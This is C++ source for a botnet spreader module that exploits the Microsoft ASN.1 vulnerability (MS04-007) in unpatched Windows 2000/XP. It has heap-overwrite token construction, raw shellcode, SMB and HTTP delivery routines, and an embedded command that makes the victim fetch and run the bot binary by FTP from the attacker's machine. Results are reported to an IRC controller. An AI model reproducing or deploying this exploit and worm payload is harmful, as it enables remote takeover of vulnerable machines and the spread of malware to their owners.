/*
	Microsoft ASN.1 remote exploit for CAN-2003-0818
	
	normal exploit written by solareclipse@phreedom.org
	r(x)bot ported version written by ScriptGod (unauthorized!!!)
	--> !!! SORRY FOR STEALING YOUR WORK !!! <--
	
	-----
	sources:
  		+ http://www.phreedom.org/solar/exploits/msasn1-bitstring/
		+ http://www.metasploit.com/projects/Framework/exploits.html#msasn1_ms04_007_killbill
		+ http://www.metasploit.com/projects/Framework/modules/exploits/msasn1_ms04_007_killbill.pm
		+ http://metasploit.com:55555/PAYLOADS
	-----

	r(x)bot shellcode didn't work in my tests and I don't have time to find out why so I used
	the metasploits shellcode and normal shell commands

	+ first interal testing version of 10.05.2005
	+ including SMB(-NT)
	+ including IIS

	this exploits systems with Windows 2000 SP2-SP4 + Windows XP SP0-SP1 and no MS04-007 patch
*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MS04007ASN1

#include <cmath>
#include <string>

////////////////////////////////////////////////////////////////
class BitString
{
	public:
		BitString();
		BitString( const char *pszString );
		BitString( void *pData, int nDataLen );
		BitString( void *pPre, int nPreLen, void *pData, int nDataLen );

		void Free();

		bool ASN1();
		bool Bits();
		bool Append( const char *pszString );
		bool Append( void *pData, int nDataLen );
		bool Append( BitString Str );
		bool Constr();
		bool Constr( BitString Str );

//	private:
		void *m_pData;
		int m_nDataLen;
};
BitString::BitString()
{
	m_nDataLen	= 0;
	m_pData		= NULL;
}
BitString::BitString( const char *pszString )
{ *this = BitString( (void*)pszString, strlen( pszString ) ); }
BitString::BitString( void *pData, int nDataLen )
{
	// alloc buffer
	void *pBuffer = malloc( nDataLen );
	if( !pBuffer )
		return;
	memset( pBuffer, 0, nDataLen );

	// copy data
	memcpy( pBuffer, pData, nDataLen );

	m_nDataLen	= nDataLen;
	m_pData		= pBuffer;
}
BitString::BitString( void *pPre, int nPreLen, void *pData, int nDataLen )
{
	// alloc buffer
	void *pBuffer = malloc( nPreLen + nDataLen );
	if( !pBuffer )
		return;
	memset( pBuffer, 0, nPreLen + nDataLen );

	// copy data
	memcpy( pBuffer, pPre, nPreLen );
	memcpy( ( (char*)pBuffer ) + nPreLen, pData, nDataLen );

	m_nDataLen	= nPreLen + nDataLen;
	m_pData		= pBuffer;
}
void BitString::Free()
{
	if( m_pData )
		free( m_pData );

	m_nDataLen	= 0;
	m_pData		= NULL;
}
bool BitString::ASN1()
{
	if( m_nDataLen >= 0xffff )
		return false;

	// check bytes needed for the number
	int nNumStrLen;
	if( m_nDataLen < 0x7f )
		nNumStrLen = 1;
	else
		nNumStrLen = 3;

	// alloc
	unsigned char *pNewData = (unsigned char*)malloc( m_nDataLen + nNumStrLen );
	if( !pNewData )
		return false;
	memset( pNewData, 0, m_nDataLen + nNumStrLen );

	// set number and append data
	if( nNumStrLen == 1 )
	{
		pNewData[ 0 ] = m_nDataLen;
		memcpy( pNewData + 1, m_pData, m_nDataLen );
	}
	else
	{
		pNewData[ 0 ] = 0x82;
		pNewData[ 1 ] = m_nDataLen >> 8;
		pNewData[ 2 ] = m_nDataLen & 0xff;

		memcpy( pNewData + 3, m_pData, m_nDataLen );
	}

	// clean up
	free( m_pData );

	m_nDataLen	= nNumStrLen + m_nDataLen;
	m_pData		= pNewData;

	return true;
}
bool BitString::Bits()
{
	// encode
	// 0x00....
	BitString StrTemp( "\x00", 1, m_pData, m_nDataLen );
	StrTemp.ASN1();

	// add 0x03 in front
	unsigned char *pNewData = (unsigned char*)malloc( StrTemp.m_nDataLen + 1 );
	if( !pNewData )
		return false;
	memset( pNewData, 0, StrTemp.m_nDataLen + 1 );
	pNewData[ 0 ] = '\x03';
	memcpy( pNewData + 1, StrTemp.m_pData, StrTemp.m_nDataLen );

	// clear old
	Free();

	m_nDataLen	= StrTemp.m_nDataLen + 1;
	m_pData		= pNewData;

	StrTemp.Free();

	return true;
}
bool BitString::Append( void *pData, int nDataLen )
{
	BitString Temp( m_pData, m_nDataLen, pData, nDataLen );

	Free();

	*this = Temp;

	return true;
}
bool BitString::Append( const char *pszString )
{ return Append( (void*)pszString, strlen( pszString ) ); }
bool BitString::Append( BitString Str )
{ return Append( Str.m_pData, Str.m_nDataLen ); }
bool BitString::Constr()
{
	// encode
	if( !ASN1() )
		return false;

	// add 0x23 before data
	BitString StrTemp2( "\x23", 1, m_pData, m_nDataLen );

	Free();

	*this = StrTemp2;

	return true;
}
bool BitString::Constr( BitString Str )
{
	if( !Append( Str ) )
		return false;

	return Constr();
}
////////////////////////////////////////////////////////////////
BitString Token( void *pStage0, int nStage0Len, void *pStage1, int nStage1Len )
{
	BitString Token;
	char szRand[ 2048 ];

	static unsigned char tag[] = "\x90\x42\x90\x42\x90\x42\x90\x42";

	// The first two overwrites must succeed, so we write to an unused location
	// in the PEB block. We don't care about the values, because after this the
	// doubly linked list of free blocks is corrupted and we get to the second
	// overwrite which is more useful.

	static unsigned char fw[] = "\xf8\x0f\x01\x00"; // 0x00010ff8
	static unsigned char bk[] = "\xf8\x0f\x01";

	// The second overwrite writes the address of our shellcode into the
	// FastPebLockRoutine pointer in the PEB

	static unsigned char peblock[] = "\x20\xf0\xfd\x7f"; // FastPebLockRoutine in PEB

	if( nStage0Len > 1032 || sizeof( tag ) - 1 + nStage1Len > 1032 )
		return Token;

	BitString Temp_Constr_FWBK;
	BitString Temp_Bits_TagStage1;
	BitString Temp_Constr_Unknown;
	BitString Temp_Bits_PEBlockStage0;
	BitString Temp_Constr_PEBlockStage0_Unknown;
	BitString Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1;
	BitString CompleteBitString;
	// ---

	// Temp_Constr_FWBK
	Temp_Constr_FWBK.Append( fw, sizeof( fw ) - 1 );
	Temp_Constr_FWBK.Append( bk, sizeof( bk ) - 1 );
	Temp_Constr_FWBK.Bits();
	Temp_Constr_FWBK.Constr();

	// Temp_Bits_TagStage1
	memset( szRand, 'B', sizeof( szRand ) );
	Temp_Bits_TagStage1.Append( tag, sizeof( tag ) - 1 );	
	Temp_Bits_TagStage1.Append( pStage1, nStage1Len );
	Temp_Bits_TagStage1.Append( szRand, 1033 - Temp_Bits_TagStage1.m_nDataLen );
	Temp_Bits_TagStage1.Bits();

	// Temp_Const_Unknown.
	Temp_Constr_Unknown.Append( "\xeb\x06\x90\x90\x90\x90\x90\x90" );
	Temp_Constr_Unknown.Bits();
	memset( szRand, 'D', sizeof( szRand ) );
	BitString Bits_Unknown2( szRand, 1040 );
	Bits_Unknown2.Bits();
	Temp_Constr_Unknown.Constr( Bits_Unknown2 );
	Bits_Unknown2.Free();

	// Temp_Bits_PEBlockStage0
	memset( szRand, 'C', sizeof( szRand ) );
	Temp_Bits_PEBlockStage0.Append( "CCCC" );
	Temp_Bits_PEBlockStage0.Append( peblock, sizeof( peblock ) - 1 );
	Temp_Bits_PEBlockStage0.Append( pStage0, nStage0Len );
	Temp_Bits_PEBlockStage0.Append( szRand, 1032 - nStage0Len );
	Temp_Bits_PEBlockStage0.Bits();

	// Temp_Constr_PEBlockStage0_Unknown
	Temp_Constr_PEBlockStage0_Unknown.Append( Temp_Bits_PEBlockStage0 );
	Temp_Constr_PEBlockStage0_Unknown.Append( Temp_Constr_Unknown );
	Temp_Constr_PEBlockStage0_Unknown.Constr();
	Temp_Bits_PEBlockStage0.Free();
	Temp_Constr_Unknown.Free();

	// Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1
	Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append( Temp_Bits_TagStage1 );
	Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append( Temp_Constr_FWBK );
	Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Append( Temp_Constr_PEBlockStage0_Unknown );
	Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Constr();
	Temp_Bits_TagStage1.Free();
	Temp_Constr_FWBK.Free();
	Temp_Constr_PEBlockStage0_Unknown.Free();

	// CompleteBitString
	memset( szRand, 'A', sizeof( szRand ) );
	CompleteBitString.Append( szRand, 1024 );
	CompleteBitString.Bits();
	CompleteBitString.Append( "\x03\x00", 2 );
	CompleteBitString.Append( Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1 );
	CompleteBitString.Constr();
	Temp_Constr_PEBlockStage0_Unknown_FWBK_TagStage1.Free();

	// Token
	BitString Temp_Token1;
	BitString Temp_Token2;
	// ---
	Temp_Token1.Append( CompleteBitString );
	Temp_Token1.ASN1();
	CompleteBitString.Free();
	// ---
	Temp_Token2.Append( "\xa1" );
	Temp_Token2.Append( Temp_Token1 );
	Temp_Token2.ASN1();
	Temp_Token1.Free();
	// ---
	Temp_Token1.Append( "\x30" );
	Temp_Token1.Append( Temp_Token2 );
	Temp_Token1.ASN1();
	Temp_Token2.Free();
	// ---
	Temp_Token2.Append( "\x06\x06\x2b\x06\x01\x05\x05\x02\xa0" );
	Temp_Token2.Append( Temp_Token1 );
	Temp_Token2.ASN1();
	Temp_Token1.Free();
	// ---
	Token.Append( "\x60" );
	Token.Append( Temp_Token2 );
	Temp_Token2.Free();

	return Token;
}
////////////////////////////////////////////////////////////////
int MyRecv( SOCKET nFDSocket, char *pBuffer, int nLen, int nFlags )
{
	fd_set ReadFDSet;
	fd_set ExceptFDSet;
	
	FD_ZERO( &ReadFDSet );
	FD_ZERO( &ExceptFDSet );
	
	FD_SET( nFDSocket, &ReadFDSet );
	FD_SET( nFDSocket, &ExceptFDSet );

	// 10 seconds
	timeval Timeout;
	Timeout.tv_sec	= 10;
	Timeout.tv_usec	= 0;

	// wait until timeout is reached
	if( select( nFDSocket + 1, &ReadFDSet, NULL, &ExceptFDSet, &Timeout ) != 1 )
		return false;

	// check if there is data is to receive
	if( !FD_ISSET( nFDSocket, &ReadFDSet ) )
		return false;

	// receive
	return frecv( nFDSocket, pBuffer, nLen, nFlags );
}
////////////////////////////////////////////////////////////////
bool SendSMB( SOCKET nFDSocket, void *pData, int nLen )
{
	long nNetNum = fhtonl( nLen );
	if( fsend( nFDSocket, (char*)&nNetNum, sizeof( nNetNum ), 0 ) != sizeof( nNetNum ) )
		return false;
	
	return ( fsend( nFDSocket, (char*)pData, nLen, 0 ) == nLen );
}
bool ExploitSMB( SOCKET nFDSocket, BitString BitToken )
{
	static char SMB_Negotiate[] =
	"\xff\x53\x4d\x42"		// protocol id
	"\x72"					// command (NEGOTIATE_MESSAGE)
	"\x00\x00\x00\x00"		// status
	"\x18"					// flags (pathnames are case-insensitive)
	"\x53\xC8"				// flags2 (support Unicode, NT error codes, long
	// filenames, extended security negotiation and
	// extended attributes)
	"\x00\x00"				// Process ID high word
	"\x00\x00\x00\x00"		// signature
	"\x00\x00\x00\x00"
	"\x00\x00"				// reserved
	"\x00\x00"				// Tree ID
	"\x37\x13"				// Process ID
	"\x00\x00"				// User ID
	"\x00\x00"				// Multiplex ID
	// SMB Message Parameters
	"\x00"					// word count
	// SMB Message Data
	"\x62\x00"				// byte count
	"\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50\x52\x4F\x47"
	"\x52\x41\x4D\x20\x31\x2E\x30\x00"									// PC NETWORK PROGRAM 1.0
	"\x02\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00"						// LANMAN1.0
	"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72"
	"\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"				// WfW 3.1a
	"\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00"						// LM1.2X002
	"\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00"						// LANMAN2.1
	"\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";					// NT LM 0.12
	static char SMB_SessionSetup1[] =
	// SMB Message Header
	"\xff\x53\x4d\x42"		// protocol id
	"\x73"					// command (Session Setup AndX)
	"\x00\x00\x00\x00"		// status
	"\x18"					// flags (pathnames are case-insensitive)
	"\x07\xC8"				// flags2 (support Unicode, NT error codes, long
	// filenames, extended security negotiation and
	// extended attributes and security signatures)
	"\x00\x00"				// Process ID high word
	"\x00\x00\x00\x00"		// signature
	"\x00\x00\x00\x00"
	"\x00\x00"				// reserved
	"\x00\x00"				// Tree ID
	"\x37\x13"				// Process ID
	"\x00\x00"				// User ID
	"\x00\x00"				// Multiplex ID
	// SMB Message Parameters
	"\x0c"					// word count (12 words)
	"\xff"					// AndXCommand: No further commands
	"\x00"					// reserved
	"\x00\x00"				// AndXOffset
	"\x04\x11"				// max buffer: 4356
	"\x0a\x00"				// max mpx count: 10
	"\x00\x00"				// VC number
	"\x00\x00\x00\00";		// session key
	static char SMB_SessionSetup2[] = 
	"\x00\x00\x00\x00"		// reserved
	"\xd4\x00\x00\x80";		// capabilities
	static char SMB_SessionSetup3[] = 
	"\x00\x00\x00\x00\x00\x00";

	// build packet(s)
	// ----
	int nSMBSize = 
		sizeof( SMB_SessionSetup1 ) - 1 + 
		2 + 
		sizeof( SMB_SessionSetup2 ) - 1 + 
		2 +
		BitToken.m_nDataLen + 
		sizeof( SMB_SessionSetup3 ) - 1;
	char *pSMBPacket = (char*)malloc( nSMBSize );
	if( !pSMBPacket )
		return false;
	memset( pSMBPacket, 0, nSMBSize );
	int nPos = 0;
	// ---
	memcpy( pSMBPacket, SMB_SessionSetup1, sizeof( SMB_SessionSetup1 ) - 1 );
	nPos += sizeof( SMB_SessionSetup1 ) - 1;
	// ---
	*(short*)( &pSMBPacket[ nPos ] ) = BitToken.m_nDataLen;
	nPos += 2;
	// ---
	memcpy( pSMBPacket + nPos, SMB_SessionSetup2, sizeof( SMB_SessionSetup2 ) - 1 );
	nPos += sizeof( SMB_SessionSetup2 ) - 1;
	// ---
	*(short*)( &pSMBPacket[ nPos ] ) = BitToken.m_nDataLen;
	nPos += 2;
	// ---
	memcpy( pSMBPacket + nPos, BitToken.m_pData, BitToken.m_nDataLen );
	nPos += BitToken.m_nDataLen;
	// ---
	memcpy( pSMBPacket + nPos, SMB_SessionSetup3, sizeof( SMB_SessionSetup3 ) - 1 );
	nPos += sizeof( SMB_SessionSetup3 ) - 1;
	// ---

	char szRecvBuffer[ 256 ];

	// send packets
	// Negotiate
	if( !SendSMB( nFDSocket, SMB_Negotiate, sizeof( SMB_Negotiate ) - 1 ) )
	{
		free( pSMBPacket );
		return false;
	}
	MyRecv( nFDSocket, szRecvBuffer, sizeof( szRecvBuffer ), 0 );
	// SesstionSetup
	if( !SendSMB( nFDSocket, pSMBPacket, nSMBSize ) )
	{
		free( pSMBPacket );
		return false;
	}
	MyRecv( nFDSocket, szRecvBuffer, sizeof( szRecvBuffer ), 0 );

	free( pSMBPacket );
	return true;
}
//////////////////////////////////
bool ExploitSMBNT( SOCKET nFDSocket, BitString BitToken )
{
	// send session request
	static char SessionRequest[] =
	"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
	"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x00\x20\x43\x41\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x41\x41\x00";
	if( send( nFDSocket, SessionRequest, sizeof( SessionRequest ) - 1, 0 ) != sizeof( SessionRequest ) - 1 )
		return false;

	// check reply
	unsigned char szBuffer[ 32 ];
	if( MyRecv( nFDSocket, (char*)szBuffer, sizeof( szBuffer ), 0 ) == SOCKET_ERROR )
		return false;
	if( szBuffer[ 0 ] != 0x82 )
		return false;

	// to smb exploiting
	return ExploitSMB( nFDSocket, BitToken );
}
////////////////////////////////////////////////////////////////
unsigned long GetBase64CharsNum( unsigned long nBytesNum )
{
	unsigned long nMaxLen;
	// - base 64 "normal" data
	nMaxLen	 = ( nBytesNum * 8 ) / 6.0;
	// - CRLFs
	nMaxLen	+= floor( ( nMaxLen / 72.0 ) ) * 2;
	// - 0-terminating char
	nMaxLen++;

	return nMaxLen;
}
std::string EncodeBase64( const char *lpszData, unsigned long nDataLen, char *lpszEndOfLine = "\r\n" )
{
	static char Base64CharTable[] =
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	"abcdefghijklmnopqrstuvwxyz"
	"0123456789+/";

	// reserve memory
	std::string sBase64;
	sBase64.reserve( GetBase64CharsNum( nDataLen ) );
	
	// encode
	unsigned long nLinePos = 0;
	while( nDataLen > 0 )
	{
		unsigned long n;

		// get 24 bits
		// - get bytes available
		unsigned long nBytesCount;
		if( nDataLen >= 3 )
			nBytesCount = 3;
		else if( nDataLen == 2 )
			nBytesCount	= 2;
		else if( nDataLen == 1 )
			nBytesCount	= 1;
		unsigned long nBase64Blocks = ceil( ( nBytesCount * 8.0 / 6.0 ) );
		// - read
		char Bytes[ 3 ];
		for( n = 0; n < nBytesCount; n++ )
			Bytes[ n ] = lpszData[ n ];
		lpszData += nBytesCount;
		nDataLen -= nBytesCount;

		// encode
		char Base64TableIndex[ 4 ];
		Base64TableIndex[ 0 ] = ( Bytes[0] & 0xfc ) >> 2;
		Base64TableIndex[ 1 ] = ( ( Bytes[ 0 ] & 0x03 ) << 4 ) + ( ( Bytes[ 1 ] & 0xf0 ) >> 4 );
		Base64TableIndex[ 2 ] = ( ( Bytes[ 1 ] & 0x0f ) << 2 ) + ( ( Bytes[ 2 ] & 0xc0 ) >> 6 );
		Base64TableIndex[ 3 ] = Bytes[ 2 ] & 0x3f;
		for( n = 0; n < nBase64Blocks; n++ )
		{
			sBase64.append( 1, Base64CharTable[ Base64TableIndex[ n ] ] );
			nLinePos++;
		}

		// lines
		if( nLinePos >= 72 )
		{
			sBase64.append( lpszEndOfLine );
			nLinePos = 0;
		}

		// add padding
		for( n = nBase64Blocks; n < 4; n++ )
			sBase64.append( 1, '=' );
	}

	return sBase64;
}
//////////////////////////////////
bool ExploitHTTP( SOCKET nFDSocket, BitString BitToken, std::string sHost )
{
	static const char szReq[] =
	"GET / HTTP/1.0\r\n"
	"Host: %s\r\n"
	"Authorization: Negotiate %s\r\n"
	"\r\n";

	// encode to Base64
	std::string sBase64Token = EncodeBase64( (char*)BitToken.m_pData, BitToken.m_nDataLen, "" );

	// make request
	int nReqSize =
		sizeof( szReq ) - 2 - 2 + 
		sHost.length() + 
		sBase64Token.length();
	char *pszReqFormated = (char*)malloc( nReqSize );
	if( !pszReqFormated )
		return false;
	// ---
	_snprintf( pszReqFormated, nReqSize, szReq, sHost.c_str(), sBase64Token.c_str() );

	// send request
	if( fsend( nFDSocket, pszReqFormated, nReqSize, 0 ) != nReqSize )
	{
		free( pszReqFormated );
		return false;
	}
	free( pszReqFormated );

	return true;
}
////////////////////////////////////////////////////////////////
BOOL MS04_007_MSASN1_PortedByScriptGod( EXINFO exinfo )
{
	static char Stage0[] =
	"\x53\x56\x57\x66\x81\xec\x80\x00\x89\xe6\xe8\xed\x00\x00\x00\xff"
	"\x36\x68\x09\x12\xd6\x63\xe8\xf7\x00\x00\x00\x89\x46\x08\xe8\xa2"
	"\x00\x00\x00\xff\x76\x04\x68\x6b\xd0\x2b\xca\xe8\xe2\x00\x00\x00"
	"\x89\x46\x0c\xe8\x3f\x00\x00\x00\xff\x76\x04\x68\xfa\x97\x02\x4c"
	"\xe8\xcd\x00\x00\x00\x31\xdb\x68\x10\x04\x00\x00\x53\xff\xd0\x89"
	"\xc3\x56\x8b\x76\x10\x89\xc7\xb9\x10\x04\x00\x00\xf3\xa4\x5e\x31"
	"\xc0\x50\x50\x50\x53\x50\x50\xff\x56\x0c\x8b\x46\x08\x66\x81\xc4"
	"\x80\x00\x5f\x5e\x5b\xff\xe0\x60\xe8\x23\x00\x00\x00\x8b\x44\x24"
	"\x0c\x8d\x58\x7c\x83\x43\x3c\x05\x81\x43\x28\x00\x10\x00\x00\x81"
	"\x63\x28\x00\xf0\xff\xff\x8b\x04\x24\x83\xc4\x14\x50\x31\xc0\xc3"
	"\x31\xd2\x64\xff\x32\x64\x89\x22\x31\xdb\xb8\x90\x42\x90\x42\x31"
	"\xc9\xb1\x02\x89\xdf\xf3\xaf\x74\x03\x43\xeb\xf3\x89\x7e\x10\x64"
	"\x8f\x02\x58\x61\xc3\x60\xbf\x20\xf0\xfd\x7f\x8b\x1f\x8b\x46\x08"
	"\x89\x07\x8b\x7f\xf8\x81\xc7\x78\x01\x00\x00\x89\xf9\x39\x19\x74"
	"\x04\x8b\x09\xeb\xf8\x89\xfa\x39\x5a\x04\x74\x05\x8b\x52\x04\xeb"
	"\xf6\x89\x11\x89\x4a\x04\xc6\x43\xfd\x01\x61\xc3\xa1\x0c\xf0\xfd"
	"\x7f\x8b\x40\x1c\x8b\x58\x08\x89\x1e\x8b\x00\x8b\x40\x08\x89\x46"
	"\x04\xc3\x60\x8b\x6c\x24\x28\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea"
	"\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x38\x49\x8b\x34\x8b\x01\xee"
	"\x31\xff\x31\xc0\xfc\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb"
	"\xf4\x3b\x7c\x24\x24\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b"
	"\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc2"
	"\x08\x00\xeb\xfe";

	/* win32_exec -  EXITFUNC=thread Size=138 Encoder=None http://metasploit.com */
	static unsigned char MetasploitShellCode[] =
	"\x81\xc4\x54\xf2\xff\xff" //add esp, -3500
	"\xfc\xe8\x46\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
	"\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x2e\x49\x8b\x34\x8b\x01\xee\x31"
	"\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54"
	"\x24\x04\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c"
	"\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b"
	"\x40\x30\x85\xc0\x78\x0f\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08"
	"\xe9\x0b\x00\x00\x00\x8b\x40\x34\x05\x7c\x00\x00\x00\x8b\x68\x3c"
	"\x5f\x31\xf6\x60\x56\xeb\x0d\x68\xef\xce\xe0\x60\x68\x98\xfe\x8a"
	"\x0e\x57\xff\xe7\xe8\xee\xff\xff\xff"/*\x00"*/;

	// shell code/command
	char ShellBuff[ 1024 ] = { 0 };
	// ---
	memcpy( ShellBuff, MetasploitShellCode, sizeof( MetasploitShellCode ) - 1 );
	// ---
	int nCmdLen = _snprintf( ShellBuff + sizeof( MetasploitShellCode ) - 1, sizeof( ShellBuff ),
		//"cmd /c tftp -i %s GET %s%&start %s&exit", GetIP( exinfo.sock ), filename, filename );
		"cmd /k echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &%s\r\n",
		GetIP(exinfo.sock),FTP_PORT, filename, filename);	
	int nShellBuffSize = sizeof( MetasploitShellCode ) - 1 + nCmdLen + 1;

	// make Token
	BitString BitToken = Token( Stage0, sizeof( Stage0 ) - 1, ShellBuff, nShellBuffSize );
	if( !BitToken.m_nDataLen )
		return FALSE;

	// do exploit
	int nCount	= 0;
	BOOL bOK	= FALSE;
	while( nCount < 2 && !bOK )
	{
		// socket
		SOCKET nFDSocket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		if( nFDSocket != SOCKET_ERROR )
		{
			// connect
			sockaddr_in SockAddr			= { 0 };
			SockAddr.sin_family				= AF_INET;
			SockAddr.sin_port				= fhtons( exinfo.port );
			SockAddr.sin_addr.S_un.S_addr 	= finet_addr( exinfo.ip );
			if( fconnect( nFDSocket, (sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
			{
				// send exploit data
				if( exinfo.port == 80 )
					bOK = ExploitHTTP( nFDSocket, BitToken, exinfo.ip );
				else if( exinfo.port == 139 )
					bOK = ExploitSMBNT( nFDSocket, BitToken );
				else if( exinfo.port == 445 )
					bOK = ExploitSMB( nFDSocket, BitToken );
			}

			fclosesocket( nFDSocket );
		}

		// retry it
		if( !bOK )
			Sleep( 1000 );
		nCount++;
	}
	BitToken.Free();

	// info
 	if( bOK )
 	{
 		char buffer[ IRCLINE ];
 		_snprintf( buffer, sizeof(buffer), "%s// %s.", exploit[ exinfo.exploit ].name, exinfo.ip );
 		irc_privmsg( exinfo.sock, exinfo.chan, buffer, exinfo.notice );
 		addlog( buffer );
		exploit[ exinfo.exploit ].stats++;
 	}
 
 	return bOK;
}

#endif